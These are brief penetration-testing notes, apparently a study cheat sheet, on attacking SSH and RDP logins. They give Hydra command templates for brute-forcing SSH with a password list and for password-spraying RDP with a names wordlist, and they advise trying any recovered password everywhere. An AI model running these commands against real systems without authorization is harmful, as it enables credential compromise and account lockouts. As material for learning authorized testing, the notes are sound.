# Attacking Network Services Logins

## SSH and RDP
Hydra
```bash
hydra -l <USERNAME> -P <PASSWORDLIST_PATH> -s <PORT> ssh://<TARGETIP>
```
We can find usernames by enumeration/information gathering techniques and by using built-in accounts such as root or Administrator

Password spraying: single password, many usernames

Once you have a password, TRY USING IT EVERYWHERE!!!

Hydra can help with this:
```bash
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "<PASSWORD>" rdp://<TARGET_IP>
```

This can lead to accounts being locked out so do not blindly launch these tools.
